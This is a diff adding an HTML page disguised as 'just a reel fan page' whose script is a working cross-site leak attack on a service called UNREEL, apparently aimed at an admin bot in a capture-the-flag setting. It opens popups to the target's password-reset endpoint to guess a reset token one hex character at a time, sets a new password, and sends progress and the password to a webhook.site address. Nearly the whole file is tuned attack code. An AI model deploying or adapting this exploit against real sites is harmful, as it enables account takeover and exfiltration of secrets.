@@ -1,0 +1,170 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>just a reel fan page</title>
+</head>
+<body>
+<script>
+'use strict';
+// ---- XS-Leak oracle attack on UNREEL (popup edition v13: tunable round width) ----
+// v13 adds ?w=NNNN: per-visit ROUND_WAIT_MAX override (3000-8000ms).
+//   fast target (burst <1s):   no &w=  -> default 5000, 2-3 chars/visit
+//   mid-slow (burst 1-2.5s):   &w=6500 -> round-1 deadline 6.8s survives
+//                              ~5-5.5s closes, 1 char/visit + recovery sets;
+//                              pool refills (unverified) make 31 reachable
+//   dead-slow (burst >3s):     do not attack
+// v11 lesson: on a ~4.4s/round target, round 2/3 tail beacons land at 9.5s+
+// and context.close() kills them mid-flight — progress escapes but the
+// completion signal dies, stranding the shepherd and burning an admin
+// session. v12 fixes the tail:
+//   - VERDICT_BY 9550 -> 8800: every verdict+beacon done by ~8.7s (1.3s margin)
+//   - ROUND_WAIT_MAX 4000 -> 5000: round-1 verdict survives 4.5s closes
+//   - survivor popups are closed only AFTER the final beacon (the ~0.4s
+//     close loop used to sit between verdict and beacon, pushing it past
+//     the window edge)
+//   - progress/retry/start switched from fetch (needs full round-trip) to
+//     sendBeacon (fire-and-forget, survives page death)
+//   - reaching 31 chars late still beacons visit-done first, so the shepherd
+//     resubmits p=31 and the next visit runs FINAL at t~0.1s with live
+//     popups whose POSTs actually land before the window closes
+//   422 (prefix correct, incomplete) -> page stays    -> popup stays open
+//   403 (wrong)  -> finish() -> +2000ms -> window.close()
+
+const NEWPASS = 'unreel-pwned-2026';
+const HEX = '0123456789abcdef';
+const FULL15 = '0123456789abcde';   // default set; 'f' decided by elimination
+let ROUND_WAIT_MAX = 5000;
+const VERDICT_BY = 8800;            // round must be judged by this absolute ms
+const ROUND_OVERHEAD = 400;         // verdict -> next round start (sleep+beacon)
+
+const params = new URLSearchParams(location.search);
+const TARGET = (() => {
+  const t = params.get('t') || '';
+  return /^https:\/\/[a-z0-9.-]+$/i.test(t) ? t.replace(/\/+$/, '') : '';
+})();
+const REPORT = (() => {
+  const r = params.get('r') || '';
+  return /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(r)
+    ? 'https://webhook.site/' + r : '';
+})();
+let prefix = (params.get('p') || '').replace(/[^0-9a-f]/g, '').slice(0, 31);
+// candidate set for the FIRST round only; later rounds use the full set.
+// ?s=147a -> test only 1,4,7,a (explicit set, no elimination shortcut).
+let firstSet = (params.get('s') || '').replace(/[^0-9a-f]/g, '');
+if (firstSet.length < 2) firstSet = '';
+// per-visit round width override: ?w=6500 for mid-slow targets
+const wq = parseInt(params.get('w') || '', 10);
+if (wq >= 3000 && wq <= 8000) ROUND_WAIT_MAX = wq;
+
+function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }
+
+function payload(data) {
+  return JSON.stringify({ t: new Date().toISOString(), ...data });
+}
+function beacon(data) {
+  if (!REPORT) return;
+  try {
+    navigator.sendBeacon(REPORT, new Blob([payload(data)], { type: 'text/plain' }));
+  } catch (e) { /* best effort */ }
+}
+
+function popupUrl(ch) {
+  return `${TARGET}/password/?token=${prefix}${ch}&password=${encodeURIComponent(NEWPASS)}`;
+}
+
+// Track every popup we open so survivors can be closed AFTER the final
+// beacon (never between verdict and beacon — that delay killed v11 tails).
+const allPops = [];
+function closeAll() {
+  for (const w of allPops) { try { if (!w.closed) w.close(); } catch (e) {} }
+}
+
+// Open one popup per candidate, wait until all-but-one (or all) are closed
+// or the wait runs out. Does NOT close survivors — returns closed flags only.
+async function round(cand, waitMs) {
+  const pops = [];
+  for (let i = 0; i < cand.length; i++) {
+    let w = null;
+    try { w = window.open(popupUrl(cand[i]), '_blank'); } catch (e) { /* keep null */ }
+    pops[i] = w;
+    if (w) allPops.push(w);
+    if (i > 0 && i < cand.length - 1) await sleep(20);
+  }
+  const deadline = Date.now() + waitMs;
+  const need = cand.length - 1;
+  for (;;) {
+    let closed = 0;
+    for (const w of pops) { if (!w || w.closed) closed++; }
+    if (closed >= need) break;
+    if (Date.now() > deadline) break;
+    await sleep(40);
+  }
+  await sleep(80);
+  return pops.map((w) => !w || w.closed);
+}
+
+// Returns the winning char, or null on a failed verdict.
+function decide(cand, states) {
+  const open = states.map((v, i) => [v, i]).filter(([v]) => !v);
+  if (open.length === 1) return cand[open[0][1]];
+  if (open.length === 0 && cand === FULL15) return 'f'; // elimination shortcut
+  return null;
+}
+
+(async () => {
+  if (!TARGET || !REPORT) return;
+  beacon({ event: 'start', prefix, target: TARGET });
+  const T0 = Date.now();
+  let useSet = firstSet;
+
+  while (prefix.length < 31) {
+    const elapsed = Date.now() - T0;
+    const wait = Math.min(ROUND_WAIT_MAX, VERDICT_BY - elapsed - ROUND_OVERHEAD);
+    if (wait < 1200) break;
+    const cand = useSet || FULL15;
+    const states = await round(cand, wait);
+    const c = decide(cand, states);
+    if (c === null) {
+      // verdict failed: still-open candidates survived or lagged.
+      // retry in-page with just the open ones, but ONLY if the window still
+      // has room for a verdict + a beacon (>= 2s budget).
+      const openCands = cand.split('').filter((_, i) => !states[i]).join('');
+      const retryBudget = VERDICT_BY - (Date.now() - T0) - ROUND_OVERHEAD;
+      if (cand === FULL15 && openCands.length >= 2 && openCands.length < 15 && retryBudget >= 2000) {
+        useSet = openCands;
+        beacon({ event: 'retry', prefix, open: openCands });
+        continue;
+      }
+      // small set failed too (or nothing open, or no retry budget):
+      // beacon the round-fail so cross-visit recovery still gets the set
+      beacon({ event: 'round-fail', prefix, open: openCands });
+      break;
+    }
+    prefix += c;
+    useSet = ''; // later rounds use the full default set
+    beacon({ event: 'progress', prefix });
+  }
+
+  if (prefix.length === 31) {
+    // Full prefix known: fire all 16; the full-token POST changes the password.
+    // visit-done goes out FIRST — if this FINAL was reached late in the
+    // window the popups (and the FINAL beacon) may die; the shepherd then
+    // resubmits p=31 and the next visit runs this block at t~0.1s with
+    // live popups. Re-running FINAL after a success is harmless (consumed
+    // token -> all 403 -> beacon still fires).
+    beacon({ event: 'visit-done', prefix });
+    for (let i = 0; i < HEX.length; i++) {
+      try { window.open(popupUrl(HEX[i]), '_blank'); } catch (e) { /* ignore */ }
+      if (i > 0 && i < HEX.length - 1) await sleep(20);
+    }
+    await sleep(1200);
+    beacon({ event: 'FINAL', password: NEWPASS });
+    return; // popups must live on for their POSTs — context dies at 10s anyway
+  }
+  beacon({ event: 'visit-done', prefix });
+  closeAll();
+})();
+</script>
+</body>
+</html>
